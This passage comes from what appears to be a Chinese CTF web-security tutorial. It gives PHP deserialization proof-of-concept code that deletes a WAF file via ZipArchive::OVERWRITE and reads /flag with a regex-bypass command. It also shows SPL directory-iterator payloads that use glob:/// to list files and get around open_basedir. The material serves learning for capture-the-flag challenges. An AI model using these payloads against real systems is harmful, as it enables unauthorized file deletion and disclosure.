class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>;<span class="comment">//或者为8</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>删除后，我们直接构造命令执行，也需要绕过正则</p>
<p>我们这种只需要用<code>''</code>或者<code>\</code>来过滤即可</p>
<p>POC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;n\l /flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<h4 id="php-原生文件操作类"><a class="markdownIt-Anchor" href="#php-原生文件操作类"></a> PHP 原生文件操作类</h4>
<h5 id="spl"><a class="markdownIt-Anchor" href="#spl"></a> SPL</h5>
<p>SPL是php标准库</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">PHP: SPL - Manual</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SPL 对 PHP 引擎进行了扩展，例如 <span class="built_in">ArrayAccess</span>、<span class="built_in">Countable</span> 和 <span class="built_in">SeekableIterator</span> 等接口，它们用于以数组形式操作对象。同时，你还可以使用 <span class="built_in">RecursiveIterator</span>、ArrayObejcts 等其他迭代器进行数据的迭代操作。它还内置几个的对象例如 Exceptions、<span class="built_in">SplObserver</span>、Spltorage 以及 splautoloadregister、splclasses、iteratorapply 等的帮助函数（helper functions），用于重载对应的功能。这些工具聚合在一起就好比是把多功能的瑞士军刀，善用它们可以从质上提升 PHP 的代码效率</span><br></pre></td></tr></table></figure>
<h5 id="遍历文件目录的类"><a class="markdownIt-Anchor" href="#遍历文件目录的类"></a> 遍历文件目录的类</h5>
<ul>
<li>DirectoryIterator 类</li>
<li>FilesystemIterator 类</li>
<li>GlobIterator 类</li>
</ul>
<h5 id="directoryiterator-类"><a class="markdownIt-Anchor" href="#directoryiterator-类"></a> DirectoryIterator 类</h5>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DirectoryIterator</span> <span class="keyword">extends</span> <span class="built_in">SplFileInfo</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">current</span> ( ) : <span class="built_in">DirectoryIterator</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getATime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getBasename</span> ( <span class="keyword">string</span> <span class="variable">$suffix</span> = ? ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getCTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getExtension</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getFilename</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getGroup</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getInode</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getMTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getOwner</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPath</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPathname</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPerms</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getSize</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getType</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isDir</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isDot</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isExecutable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isFile</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isLink</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isReadable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isWritable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">seek</span> ( <span class="keyword">int</span> <span class="variable">$position</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span>    <span class="comment">// 以字符串形式获取文件名</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">valid</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<p>遍历文件目录,直接对文件全部输出出来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：</p>
<blockquote>
<p>glob:// 协议用来查找匹配的文件路径模式</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;glob:///flag&quot;);</span><br><span class="line">echo $dir;</span><br></pre></td></tr></table></figure>
<h5 id="filesystemiterator-类"><a class="markdownIt-Anchor" href="#filesystemiterator-类"></a> FilesystemIterator 类</h5>
<p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
<p>都是一样的，我们就列举一个</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接对文件目录全部输出出来。</p>
<h5 id="globiterator类"><a class="markdownIt-Anchor" href="#globiterator类"></a> GlobIterator类</h5>
<p>GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径</p>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GlobIterator</span> <span class="keyword">extends</span> <span class="built_in">FilesystemIterator</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> , <span class="built_in">Countable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">count</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="comment">/* 继承的方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">SKIP_DOTS</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">current</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">getFlags</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">setFlags</span> ( <span class="keyword">int</span> <span class="variable">$flags</span> = ? ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<p>其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 <code>__toString()</code> 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。</p>
<p>意思就是我们可以在<code>GlobIterator</code>中直接使用正则匹配路径来遍历目录</p>
<p>遍历目录全部文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="使用可遍历目录类绕过-open_basedir"><a class="markdownIt-Anchor" href="#使用可遍历目录类绕过-open_basedir"></a> 使用可遍历目录类绕过 open_basedir</h5>
<p>关于绕过open_basedir()可以看看<a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/120221577">这个文章</a></p>
<h5 id="使用directoryiterator类"><a class="markdownIt-Anchor" href="#使用directoryiterator类"></a> 使用DirectoryIterator类</h5>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">其中cmd=glob:<span class="comment">///*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用filesystemiterator"><a class="markdownIt-Anchor" href="#使用filesystemiterator"></a> 使用FilesystemIterator</h5>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">其中cmd=glob:<span class="comment">///*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用-globiterator-类"><a class="markdownIt-Anchor" href="#使用-globiterator-类"></a> 使用 GlobIterator 类</h5>
